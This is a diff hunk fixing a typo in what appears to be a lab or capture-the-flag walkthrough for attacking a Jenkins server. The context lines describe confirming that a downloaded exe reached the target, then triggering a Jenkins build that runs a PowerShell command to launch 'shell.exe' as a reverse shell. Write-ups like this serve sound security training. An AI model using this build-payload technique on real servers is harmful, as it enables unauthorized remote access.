@@ -247,7 +247,7 @@ To check that the exe has been sucessfully downloaded:
 * You should see the connection from the python http server
 * You can check the console output from Jenkins
 
-Do another build with this payload to start the rever shell:
+Do another build with this payload to start the reverse shell:
 
 ~~~
 powershell -command "Start-Process shell.exe"
